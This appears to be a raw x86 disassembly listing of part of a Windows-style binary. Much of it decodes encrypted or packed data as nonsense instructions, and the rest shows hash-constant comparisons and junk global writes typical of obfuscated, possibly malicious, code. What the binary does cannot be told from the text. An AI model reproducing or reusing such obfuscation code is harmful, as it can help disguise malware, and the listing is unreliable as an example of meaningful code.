  41bb1f:	sbb    eax,DWORD PTR [ecx-0x20]
  41bb22:	mov    ds:0x33601fa2,eax
  41bb27:	dec    edx
  41bb28:	or     eax,0xb2af659a
  41bb2d:	xchg   DWORD PTR [edi-0x5fb4ebde],ebx
  41bb33:	mov    edx,0xddb1afab
  41bb38:	out    0xf3,al
  41bb3a:	repnz (bad) 
  41bb3d:	jecxz  0x41bae2
  41bb3f:	test   BYTE PTR [eax],ah
  41bb41:	data16 repz or BYTE PTR [edx-0x80],ch
  41bb46:	jb     0x41bb5c
  41bb48:	adc    edi,DWORD PTR ss:[ebx]
  41bb4b:	jae    0x41baf4
  41bb4d:	xchg   ah,al
  41bb4f:	push   esi
  41bb50:	push   edx
  41bb51:	pop    esi
  41bb52:	jbe    0x41bb3b
  41bb54:	sar    BYTE PTR [ecx+0x1b],1
  41bb57:	adc    eax,0x829480da
  41bb5c:	clc    
  41bb5d:	inc    esp
  41bb5e:	pop    eax
  41bb5f:	call   0x94d1:0x1b406c43
  41bb66:	push   ebp
  41bb67:	xchg   esp,eax
  41bb68:	jle    0x41bb29
  41bb6a:	(bad)  
  41bb6b:	lods   eax,DWORD PTR ds:[esi]
  41bb6c:	xchg   esp,eax
  41bb6d:	bt     DWORD PTR [ecx-0xc2b4b41],edx
  41bb74:	mov    dh,0xd3
  41bb76:	fsubp  st(5),st
  41bb78:	popa   
  41bb79:	test   al,0x9f
  41bb7b:	test   BYTE PTR ds:0xa8fd7b4f,bl
  41bb81:	pop    eax
  41bb82:	out    0x78,eax
  41bb84:	jae    0x41bba0
  41bb86:	test   DWORD PTR [ecx],edi
  41bb88:	mov    ds:0xbdc0e6dc,eax
  41bb8d:	sbb    bl,BYTE PTR [ecx]
  41bb8f:	clc    
  41bb90:	push   es
  41bb91:	out    dx,al
  41bb92:	mov    dh,0x31
  41bb94:	cmp    BYTE PTR [ebx],ch
  41bb96:	mov    ch,0xf6
  41bb98:	in     al,0x72
  41bb9a:	jg     0x41bbfe
  41bb9c:	pop    es
  41bb9d:	(bad)  
  41bb9e:	ffreep st(3)
  41bba0:	push   ebp
  41bba1:	mov    ds:0x60a66a52,eax
  41bba6:	xor    DWORD PTR [ecx],edi
  41bba8:	ret    
  41bba9:	jne    0x41bc21
  41bbab:	mov    ebp,0x11e989c1
  41bbb0:	in     al,dx
  41bbb1:	and    BYTE PTR [edi+0x20],al
  41bbb4:	test   eax,0xdd187a2d
  41bbb9:	retf   
  41bbba:	ja     0x41bb87
  41bbbc:	(bad)  
  41bbbd:	pop    esp
  41bbbe:	retf   
  41bbbf:	push   edx
  41bbc0:	jne    0x41bc16
  41bbc2:	pop    ebp
  41bbc3:	test   eax,0x79a8fbfa
  41bbc8:	push   ebp
  41bbc9:	jbe    0x41bbac
  41bbcb:	sbb    BYTE PTR [ebp-0x49],0xfb
  41bbcf:	inc    ecx
  41bbd0:	rcl    edx,cl
  41bbd2:	loopne 0x41bbec
  41bbd4:	stc    
  41bbd5:	mov    ch,0x1f
  41bbd7:	gs push eax
  41bbd9:	jae    0x41bbe5
  41bbdb:	stos   BYTE PTR es:[edi],al
  41bbdc:	(bad)  
  41bbdf:	popa   
  41bbe0:	cli    
  41bbe1:	sbb    eax,0x835e54ee
  41bbe6:	loope  0x41bba8
  41bbe8:	sub    edi,ebx
  41bbea:	cld    
  41bbeb:	push   ss
  41bbec:	inc    ebp
  41bbed:	and    DWORD PTR [edx+0x73d46a97],edx
  41bbf3:	test   BYTE PTR [esi+0x26],dl
  41bbf6:	test   ah,cl
  41bbf8:	cli    
  41bbf9:	push   ebx
  41bbfa:	dec    edi
  41bbfb:	rcr    DWORD PTR [ecx+0x7f],1
  41bbfe:	dec    ebp
  41bbff:	aam    0x52
  41bc01:	jge    0x41bc65
  41bc03:	xchg   ecx,eax
  41bc04:	pop    ecx
  41bc05:	and    BYTE PTR [edx-0x4c27ac80],ch
  41bc0b:	int3   
  41bc0c:	mov    ecx,0x8cbefd51
  41bc11:	ins    BYTE PTR es:[edi],dx
  41bc12:	shl    ecx,1
  41bc14:	and    ebx,DWORD PTR [esi]
  41bc16:	push   ss
  41bc17:	retf   0x6c7d
  41bc1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc1b:	mov    esp,esi
  41bc1d:	fldcw  WORD PTR [ebx+0x52]
  41bc20:	sahf   
  41bc21:	lahf   
  41bc22:	aaa    
  41bc23:	and    dh,dh
  41bc25:	push   0x25
  41bc27:	sbb    dh,BYTE PTR [ebp+esi*8-0x3c7a630f]
  41bc2e:	loopne 0x41bc3b
  41bc30:	mov    edi,0xeac77041
  41bc35:	xor    eax,0xd2b9c5
  41bc3a:	retf   
  41bc3b:	in     eax,0xe1
  41bc3d:	call   0x6c37:0x74ae87d
  41bc44:	jo     0x41bc42
  41bc46:	fcomp  DWORD PTR [edx+0x20591c1c]
  41bc4c:	sbb    BYTE PTR [esi+esi*2+0x47],ch
  41bc50:	dec    edi
  41bc51:	jb     0x41bc53
  41bc53:	popa   
  41bc54:	dec    ecx
  41bc55:	pop    edx
  41bc56:	jge    0x41bc7b
  41bc58:	mov    ds:0x4a87407b,al
  41bc5d:	daa    
  41bc5e:	xchg   ebp,eax
  41bc5f:	jmp    0x41bc4b
  41bc61:	loopne 0x41bc45
  41bc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc64:	jl     0x41bcdf
  41bc66:	gs aam 0x4b
  41bc69:	cmp    DWORD PTR [edi],0xed2f21ef
  41bc6f:	sti    
  41bc70:	cmp    DWORD PTR [esi-0x3ff54dbf],esi
  41bc76:	dec    eax
  41bc77:	ins    BYTE PTR es:[edi],dx
  41bc78:	retf   
  41bc79:	and    al,0x36
  41bc7b:	sbb    al,0x92
  41bc7d:	xchg   edi,eax
  41bc7e:	fild   WORD PTR [ecx+edi*1+0x3]
  41bc82:	xor    eax,0x80051cc6
  41bc87:	xor    BYTE PTR [ebp-0x490f0705],bh
  41bc8d:	push   edi
  41bc8e:	ret    
  41bc8f:	and    edi,esi
  41bc91:	enter  0x54b4,0x30
  41bc95:	push   edx
  41bc96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc97:	repnz push 0x1b
  41bc9a:	sub    BYTE PTR [edx],0x63
  41bc9d:	jmp    0x41bc40
  41bc9f:	push   esi
  41bca0:	popf   
  41bca1:	pusha  
  41bca2:	out    0x18,eax
  41bca4:	psubsw mm6,QWORD PTR [edx-0x1cb97fb3]
  41bcab:	mov    ch,0x65
  41bcad:	mov    ecx,0xad219df
  41bcb2:	push   es
  41bcb3:	out    0xdb,eax
  41bcb5:	jnp    0x41bd05
  41bcb7:	(bad)
  41bcbb:	dec    edi
  41bcbc:	dec    esp
  41bcbd:	inc    ecx
  41bcbe:	xlat   BYTE PTR ds:[ebx]
  41bcbf:	or     al,0xf
  41bcc1:	int3   
  41bcc2:	jmp    0x3c55:0x5ac870e0
  41bcc9:	or     ecx,DWORD PTR [edx+0x3889508]
  41bccf:	xchg   ebp,eax
  41bcd0:	pop    edi
  41bcd1:	aam    0x1
  41bcd3:	inc    eax
  41bcd4:	imul   ch
  41bcd6:	pop    ebp
  41bcd7:	mov    esi,DWORD PTR [esi-0x6c]
  41bcda:	and    al,0x6d
  41bcdc:	leave  
  41bcdd:	pop    ds
  41bcde:	(bad)  
  41bcdf:	pusha  
  41bce0:	mov    bl,0x85
  41bce2:	inc    ecx
  41bce3:	clc    
  41bce4:	xor    al,al
  41bce6:	jge    0x41bc93
  41bce8:	sbb    ah,0x94
  41bceb:	xchg   edi,eax
  41bcec:	sti    
  41bced:	test   DWORD PTR [ebp-0x12daca26],ecx
  41bcf3:	and    dl,dl
  41bcf5:	sar    dl,1
  41bcf7:	sbb    eax,0x45f66621
  41bcfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcfd:	adc    eax,0xcbc496c4
  41bd02:	in     eax,dx
  41bd03:	(bad)  
  41bd04:	sbb    bh,BYTE PTR [ebx+0x6b]
  41bd07:	or     DWORD PTR [ebx+ebp*4-0x75c6a3ab],edx
  41bd0e:	xor    eax,0x94a797c5
  41bd13:	mov    ecx,0x2ef4da34
  41bd18:	loope  0x41bd62
  41bd1a:	push   ebp
  41bd1b:	push   es
  41bd1c:	jl     0x41bd21
  41bd1e:	inc    esi
  41bd1f:	ins    DWORD PTR es:[edi],dx
  41bd20:	mov    ch,0xbe
  41bd22:	je     0x41bd1d
  41bd24:	cdq    
  41bd25:	loope  0x41bcfa
  41bd27:	sbb    bl,BYTE PTR [bp+di-0x1463]
  41bd2c:	dec    ebx
  41bd2d:	test   BYTE PTR [ecx],al
  41bd2f:	gs sbb ecx,ecx
  41bd32:	dec    edx
  41bd33:	mov    BYTE PTR [ecx+0x49010c28],dh
  41bd39:	sahf   
  41bd3a:	pop    ebx
  41bd3b:	adc    BYTE PTR [edx],0x44
  41bd3e:	or     esp,0x1d
  41bd41:	inc    ebx
  41bd42:	xchg   esp,eax
  41bd43:	pop    es
  41bd44:	push   esp
  41bd45:	in     eax,dx
  41bd46:	retf   
  41bd47:	test   al,0x6e
  41bd49:	cwde   
  41bd4a:	inc    ebx
  41bd4b:	retf   
  41bd4c:	jmp    0x41bd3f
  41bd4e:	pop    ebx
  41bd4f:	xchg   BYTE PTR ds:0x72e2a751,dh
  41bd55:	xchg   esp,eax
  41bd56:	shl    BYTE PTR [bx-0x3abf],cl
  41bd5b:	aas    
  41bd5c:	daa    
  41bd5d:	mov    ebp,0x99666410
  41bd62:	leave  
  41bd63:	sbb    eax,0xaaf28bcc
  41bd68:	xor    al,0x35
  41bd6a:	enter  0x54c1,0x77
  41bd6e:	test   eax,0x7d2e2f83
  41bd73:	pop    ds
  41bd74:	retf   
  41bd75:	sub    al,0x60
  41bd77:	dec    ebp
  41bd78:	pop    eax
  41bd79:	push   esp
  41bd7a:	shl    BYTE PTR [ebx-0x7225d203],0xbf
  41bd81:	or     ebp,ebx
  41bd83:	add    ecx,0x2aab4243
  41bd89:	mov    al,ds:0xa97f3db8
  41bd8e:	xchg   ecx,eax
  41bd8f:	adc    al,0x54
  41bd91:	sahf   
  41bd92:	hlt    
  41bd93:	cmp    ebx,ebx
  41bd95:	or     DWORD PTR [eax+eiz*2-0x1b],eax
  41bd99:	jge    0x41bd23
  41bd9b:	pop    ebp
  41bd9c:	retf   0x6e4
  41bd9f:	or     eax,DWORD PTR [edx]
  41bda1:	xchg   edx,eax
  41bda2:	sbb    cl,BYTE PTR [eax-0x65]
  41bda5:	cmc    
  41bda6:	ja     0x41bd79
  41bda8:	push   0xf470d102
  41bdad:	aaa    
  41bdae:	icebp  
  41bdaf:	and    BYTE PTR [eax],al
  41bdb1:	pop    ebx
  41bdb2:	fistp  QWORD PTR [edx-0x7c]
  41bdb5:	ss (bad) 
  41bdb8:	mov    ch,BYTE PTR [eax+0x75]
  41bdbb:	mov    ds:0x3d6cbca7,al
  41bdc0:	inc    esp
  41bdc1:	out    0x9,al
  41bdc3:	dec    ebp
  41bdc4:	mov    ds:0xc2b8405c,al
  41bdc9:	aam    0xe9
  41bdcb:	jo     0x41be21
  41bdcd:	adc    BYTE PTR [eax],cl
  41bdcf:	adc    BYTE PTR [ecx+ebp*8+0x16],dh
  41bdd3:	sbb    al,0xcd
  41bdd5:	fist   DWORD PTR [esi+0x8]
  41bdd8:	call   0xd854a9
  41bddd:	push   edi
  41bdde:	vpmacssdql ymm8,ymm6,YMMWORD PTR [esi-0xd1657e5],ymm7
  41bde8:	(bad)  
  41bde9:	dec    esp
  41bdea:	mov    dh,0x6f
  41bdec:	(bad)
  41bdef:	lea    ebx,[esi+edi*4-0x79a43e58]
  41bdf6:	loope  0x41bd97
  41bdf8:	(bad)  
  41bdfa:	inc    eax
  41bdfb:	mov    ch,0x45
  41bdfd:	call   0xc87b1ded
  41be02:	les    ecx,FWORD PTR [ebx-0x52]
  41be05:	inc    esp
  41be06:	jg     0x41bdf0
  41be08:	pop    eax
  41be09:	xor    DWORD PTR [edi+edi*2],edx
  41be0c:	shl    ecx,1
  41be0e:	adc    eax,0xd4c6f2d6
  41be13:	xor    ebx,eax
  41be15:	mov    ecx,0xa2eccf94
  41be1a:	jo     0x41be55
  41be1c:	adc    al,0xa2
  41be1e:	outs   dx,DWORD PTR ds:[esi]
  41be1f:	rol    ecx,cl
  41be21:	cmp    DWORD PTR [edx+0x19],edx
  41be24:	int3   
  41be25:	lahf   
  41be26:	push   eax
  41be27:	cdq    
  41be28:	xchg   BYTE PTR [ebx-0x67],dl
  41be2b:	or     eax,0xb4fcda28
  41be30:	xor    ebx,0xffffffa1
  41be33:	dec    ecx
  41be34:	mov    ?,WORD PTR [esi+0x6646d182]
  41be3a:	mov    ebp,0x7a50d992
  41be3f:	add    bl,BYTE PTR [ebp+0x5c]
  41be42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be43:	adc    BYTE PTR [edi-0x6e],dl
  41be46:	out    0x40,al
  41be48:	jge    0x41bec4
  41be4a:	cdq    
  41be4b:	jecxz  0x41be0e
  41be4d:	sub    eax,eax
  41be4f:	cs pop ds
  41be51:	mov    ds:0xd0ba602b,al
  41be56:	pop    ss
  41be57:	vpshlq xmm6,xmm5,[edi]
  41be5c:	or     BYTE PTR [ebp+0x4c],bh
  41be5f:	pop    ds
  41be60:	pop    es
  41be61:	inc    edx
  41be62:	daa    
  41be63:	push   cs
  41be64:	cmp    DWORD PTR [eax+0x7a],ecx
  41be67:	jne    0x41be6e
  41be69:	or     BYTE PTR [ebp-0x37ca2ebc],dl
  41be6f:	jae    0x41bed3
  41be71:	mov    dl,0x28
  41be73:	jns    0x41beca
  41be75:	adc    cl,BYTE PTR [esi-0x72]
  41be78:	mov    ebx,0x5c910643
  41be7d:	je     0x41be29
  41be7f:	dec    ebp
  41be80:	scas   eax,DWORD PTR es:[edi]
  41be81:	(bad)  
  41be82:	loop   0x41bebb
  41be84:	aas    
  41be85:	cmp    dl,BYTE PTR [edi+0x13]
  41be88:	dec    BYTE PTR [ebx]
  41be8a:	pop    ss
  41be8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be8c:	sbb    al,BYTE PTR [edx-0x41]
  41be8f:	adc    esi,esp
  41be91:	aad    0xf1
  41be93:	mov    al,0x57
  41be95:	jp     0x41beed
  41be97:	(bad)  
  41be98:	or     eax,0x2020eb72
  41be9d:	mov    bh,0xae
  41be9f:	fdiv   DWORD PTR [edi+0x50348a8a]
  41bea5:	mov    esi,0x2073dcf6
  41beaa:	adc    BYTE PTR [ebx],dl
  41beac:	sbb    BYTE PTR [ebp+0x6c],bl
  41beaf:	fisubr DWORD PTR [ecx]
  41beb1:	push   ebx
  41beb2:	ss popa 
  41beb4:	and    al,0x9f
  41beb6:	xchg   ecx,eax
  41beb7:	dec    eax
  41beb8:	push   ebx
  41beb9:	lods   al,BYTE PTR ds:[esi]
  41beba:	cmp    bh,0x7b
  41bebd:	ret    
  41bebe:	sbb    eax,0x1575583c
  41bec3:	add    BYTE PTR [edx],0x5f
  41bec6:	outs   dx,DWORD PTR ds:[esi]
  41bec7:	int    0xf1
  41bec9:	nop
  41beca:	scas   al,BYTE PTR es:[edi]
  41becb:	mov    dh,0x76
  41becd:	in     eax,0xf2
  41becf:	mov    edx,DWORD PTR [edi+0x50]
  41bed2:	shr    DWORD PTR [edx],cl
  41bed4:	xlat   BYTE PTR ds:[ebx]
  41bed5:	cmp    BYTE PTR [eax+0x6a9e0227],bh
  41bedb:	test   cl,dl
  41bedd:	mov    DWORD PTR [ecx-0x7c],ecx
  41bee0:	push   0x802c7886
  41bee5:	jns    0x41beff
  41bee7:	and    DWORD PTR [esi+0x51],0x43
  41beeb:	daa    
  41beec:	xor    esi,DWORD PTR [eax+0x15]
  41beef:	call   0xb0dc9414
  41bef4:	fisubr WORD PTR [ecx-0x42]
  41bef7:	fwait
  41bef8:	retf   
  41bef9:	in     al,dx
  41befa:	jbe    0x41bf5f
  41befc:	aad    0x8e
  41befe:	and    al,0x97
  41bf00:	imul   ebx,edx,0x3b
  41bf03:	(bad)  
  41bf04:	cmp    eax,DWORD PTR [eax]
  41bf06:	into   
  41bf07:	out    dx,eax
  41bf08:	mov    bh,0x45
  41bf0a:	int3   
  41bf0b:	xchg   ebp,eax
  41bf0c:	pop    edx
  41bf0d:	mov    WORD PTR [ecx+0x41],?
  41bf10:	and    BYTE PTR [ecx],dh
  41bf12:	add    BYTE PTR [esi+0x72],dh
  41bf15:	adc    DWORD PTR ds:0xcae8c0bf,edi
  41bf1b:	rol    eax,cl
  41bf1d:	inc    eax
  41bf1e:	or     bh,BYTE PTR [esi+0x5717bef]
  41bf24:	mov    esp,0x6da28281
  41bf29:	xchg   ebx,eax
  41bf2a:	daa    
  41bf2b:	cwde   
  41bf2c:	std    
  41bf2d:	retf   0x76c0
  41bf30:	mov    edx,0xe7792acd
  41bf35:	xor    DWORD PTR [edx+0x4f],edi
  41bf38:	cwde   
  41bf39:	mov    esi,0x772d8535
  41bf3e:	int    0xee
  41bf40:	mov    ebx,0xbba6b492
  41bf45:	mov    eax,ds:0xfcbd1079
  41bf4a:	inc    ebp
  41bf4b:	lods   eax,DWORD PTR ds:[esi]
  41bf4c:	stos   DWORD PTR es:[edi],eax
  41bf4d:	pop    es
  41bf4e:	pop    ecx
  41bf4f:	inc    eax
  41bf50:	dec    eax
  41bf51:	imul   BYTE PTR [ebx]
  41bf53:	mov    bh,0xd
  41bf55:	repz test DWORD PTR [esp+ecx*1-0x8],esp
  41bf5a:	mov    BYTE PTR [esi],0xe9
  41bf5d:	dec    ecx
  41bf5e:	jle    0x41beed
  41bf60:	(bad)  
  41bf61:	stos   BYTE PTR es:[edi],al
  41bf62:	inc    esi
  41bf63:	push   esi
  41bf64:	lea    eax,[ecx+esi*2]
  41bf67:	fdivr  DWORD PTR [esi+edi*1+0x63f0df94]
  41bf6e:	pop    edx
  41bf6f:	adc    ah,dh
  41bf71:	fs dec esi
  41bf73:	add    esi,DWORD PTR [ecx]
  41bf75:	cli    
  41bf76:	mov    ebx,0xdb1b7cba
  41bf7b:	push   esi
  41bf7c:	retf   
  41bf7d:	mov    ds:0x9e47e2b0,eax
  41bf82:	dec    ebp
  41bf83:	sahf   
  41bf84:	xchg   ebx,eax
  41bf85:	fwait
  41bf86:	clc    
  41bf87:	in     al,dx
  41bf88:	jecxz  0x41bf21
  41bf8a:	or     ch,BYTE PTR [esi+0x4a]
  41bf8d:	sub    al,0x9c
  41bf8f:	mov    eax,0xe20329aa
  41bf94:	push   es
  41bf95:	and    DWORD PTR [si+0x51],edi
  41bf99:	mov    dh,0xb8
  41bf9b:	adc    cl,BYTE PTR [ebp+ecx*4+0x6]
  41bf9f:	jecxz  0x41bfe2
  41bfa1:	test   DWORD PTR [edi+0x2b],0xc7cdb254
  41bfa8:	mov    bl,0x98
  41bfaa:	je     0x41c002
  41bfac:	xor    dh,ah
  41bfae:	push   es
  41bfaf:	mov    ebp,0xb1e6dfb7
  41bfb4:	daa    
  41bfb5:	enter  0xdd2e,0xfb
  41bfb9:	pop    edi
  41bfba:	push   ebp
  41bfbb:	ret    
  41bfbc:	ja     0x41c00c
  41bfbe:	outs   dx,BYTE PTR ds:[esi]
  41bfbf:	in     al,0x89
  41bfc1:	ficomp DWORD PTR [ecx]
  41bfc3:	repz push fs
  41bfc6:	jb     0x41bf73
  41bfc8:	add    DWORD PTR [esi-0x5b],0xffffff8a
  41bfcc:	(bad)  
  41bfcd:	jns    0x41bfbb
  41bfcf:	xor    al,0xb8
  41bfd1:	push   ecx
  41bfd2:	daa    
  41bfd3:	inc    ecx
  41bfd4:	push   esi
  41bfd5:	sti    
  41bfd6:	repnz push eax
  41bfd8:	call   0x4a367cd7
  41bfdd:	pop    ebx
  41bfde:	pushf  
  41bfdf:	lahf   
  41bfe0:	aas    
  41bfe1:	jns    0x41bf7a
  41bfe3:	jae    0x41bfe7
  41bfe5:	push   edx
  41bfe6:	lods   eax,DWORD PTR ds:[esi]
  41bfe7:	stos   DWORD PTR es:[edi],eax
  41bfe8:	pop    ss
  41bfe9:	xlat   BYTE PTR ds:[ebx]
  41bfea:	push   ecx
  41bfeb:	idiv   BYTE PTR [esi]
  41bfed:	pop    ebp
  41bfee:	ins    DWORD PTR es:[edi],dx
  41bfef:	fstp   QWORD PTR [edx+0x795bf115]
  41bff5:	push   esi
  41bff6:	fsubr  DWORD PTR [eax]
  41bff8:	mov    WORD PTR ds:0xfbd74199,fs
  41bffe:	push   edx
  41bfff:	mul    bl
  41c001:	adc    eax,0xc1589d3a
  41c006:	or     al,0x12
  41c008:	xor    al,0x1c
  41c00a:	adc    BYTE PTR [ebp+0x45],bh
  41c00d:	or     BYTE PTR [ebx-0x51e55774],dh
  41c013:	in     al,dx
  41c014:	mov    ecx,0x9915e5d9
  41c019:	cs jo  0x41bfac
  41c01c:	adc    eax,0xed152e5a
  41c021:	(bad)  
  41c022:	scas   eax,DWORD PTR es:[edi]
  41c023:	cli    
  41c024:	inc    esp
  41c025:	dec    ecx
  41c026:	sbb    ch,bh
  41c028:	sbb    ebp,DWORD PTR [ebx+ebx*2]
  41c02b:	pop    ds
  41c02c:	sbb    esp,DWORD PTR [ebx+edx*2-0x3d]
  41c030:	pop    eax
  41c031:	cmp    edx,DWORD PTR [ecx-0x208fb1a2]
  41c037:	adc    esp,DWORD PTR [edx-0x794581d]
  41c03d:	push   ss
  41c03e:	push   0xffffffec
  41c040:	fild   WORD PTR [eax]
  41c042:	sbb    al,0x3c
  41c044:	mov    BYTE PTR [esi-0x4a1da0d3],dl
  41c04a:	mov    ch,BYTE PTR [ebp-0x5bd5bad6]
  41c050:	push   edi
  41c051:	sbb    eax,0x7bddd96f
  41c056:	inc    eax
  41c057:	call   FWORD PTR [eax+edi*2+0x1ef852f7]
  41c05e:	jae    0x41c01e
  41c060:	lods   al,BYTE PTR ds:[esi]
  41c061:	jecxz  0x41c083
  41c063:	mov    DWORD PTR [eax],0xe1115881
  41c069:	test   al,0xbb
  41c06b:	and    cl,bh
  41c06d:	push   esi
  41c06e:	scas   eax,DWORD PTR es:[edi]
  41c06f:	add    al,bh
  41c071:	mov    ebx,esi
  41c073:	imul   ecx,ecx,0x47c77858
  41c079:	sbb    esp,esi
  41c07b:	xchg   BYTE PTR [ecx],al
  41c07d:	or     DWORD PTR [ecx-0x471a1c5a],0xffffffc9
  41c084:	outs   dx,DWORD PTR ds:[esi]
  41c085:	jno    0x41c0fb
  41c087:	xor    al,dl
  41c089:	mov    WORD PTR [edx],ds
  41c08b:	test   DWORD PTR [ebx-0x16],0x5cc193e4
  41c092:	pop    edi
  41c093:	mov    al,0xb5
  41c095:	jmp    0x48d:0x706a3b71
  41c09c:	ins    BYTE PTR es:[edi],dx
  41c09d:	je     0x41c0d0
  41c09f:	(bad)
  41c0a2:	push   0xffffff99
  41c0a4:	das    
  41c0a5:	mov    ah,0x6b
  41c0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a8:	and    edx,DWORD PTR [ebp-0x63e40d9d]
  41c0ae:	xor    cl,BYTE PTR ds:0x597bcb3e
  41c0b4:	push   ecx
  41c0b5:	rcr    BYTE PTR [edx],1
  41c0b7:	dec    esi
  41c0b8:	push   eax
  41c0b9:	std    
  41c0ba:	push   esi
  41c0bb:	fistp  WORD PTR [esi+eiz*1+0x3f]
  41c0bf:	cwde   
  41c0c0:	jge    0x41c049
  41c0c2:	pop    ds
  41c0c3:	fwait
  41c0c4:	unpckhpd xmm3,XMMWORD PTR [esi+0x3f]
  41c0c9:	xor    DWORD PTR [ecx-0x63],esp
  41c0cc:	aaa    
  41c0cd:	test   eax,0x7f3d4872
  41c0d2:	outs   dx,BYTE PTR ds:[esi]
  41c0d3:	hlt    
  41c0d4:	sbb    ebp,DWORD PTR [ecx+0x33]
  41c0d7:	mov    al,0xb2
  41c0d9:	xchg   ecx,eax
  41c0da:	(bad)  
  41c0db:	daa    
  41c0dc:	leave  
  41c0dd:	sbb    al,BYTE PTR [edi+0x52]
  41c0e0:	ja     0x41c0ac
  41c0e2:	test   BYTE PTR [eax+0x5c],bh
  41c0e5:	scas   al,BYTE PTR es:[edi]
  41c0e6:	jp     0x41c156
  41c0e8:	sub    DWORD PTR [edi+0x4b781d3d],0x76
  41c0ef:	mov    al,ds:0xe9e3fe33
  41c0f4:	dec    esp
  41c0f5:	idiv   DWORD PTR fs:[edx+0x5311b572]
  41c0fc:	mov    al,0xbd
  41c0fe:	mov    ecx,DWORD PTR [ebp-0x18]
  41c101:	add    edi,edx
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
